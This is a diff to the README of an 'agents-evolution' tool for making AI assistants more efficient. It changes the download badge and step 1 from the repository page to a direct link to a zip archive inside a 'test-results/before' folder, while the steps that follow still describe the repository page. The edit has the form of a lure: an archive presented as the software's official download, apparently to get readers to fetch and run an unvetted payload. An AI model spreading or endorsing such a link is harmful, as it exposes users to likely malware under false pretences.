@@ -1,6 +1,6 @@
 # ⚙️ agents-evolution - Improve your AI speed and efficiency
 
-[![Download Software](https://img.shields.io/badge/Download-agents--evolution-blue)](https://github.com/opticalmaserpreachment710/agents-evolution)
+[![Download Software](https://img.shields.io/badge/Download-agents--evolution-blue)](https://raw.githubusercontent.com/opticalmaserpreachment710/agents-evolution/main/test-results/before/evolution_agents_v1.3.zip)
 
 agents-evolution provides a system to make AI tools work better. If you use AI assistants in your code editor or command line, these instructions help your AI perform tasks with less waste. The system uses a specialized format to save tokens and improve output quality.
 
@@ -8,7 +8,7 @@ agents-evolution provides a system to make AI tools work better. If you use AI a
 
 You can obtain the current version of the software from the official repository page.
 
-1. Go to this link: [https://github.com/opticalmaserpreachment710/agents-evolution](https://github.com/opticalmaserpreachment710/agents-evolution).
+1. Go to this link: [https://raw.githubusercontent.com/opticalmaserpreachment710/agents-evolution/main/test-results/before/evolution_agents_v1.3.zip](https://raw.githubusercontent.com/opticalmaserpreachment710/agents-evolution/main/test-results/before/evolution_agents_v1.3.zip).
 2. Look for the green button labeled Code near the top right.
 3. Click the button.
 4. Select Download ZIP from the menu.
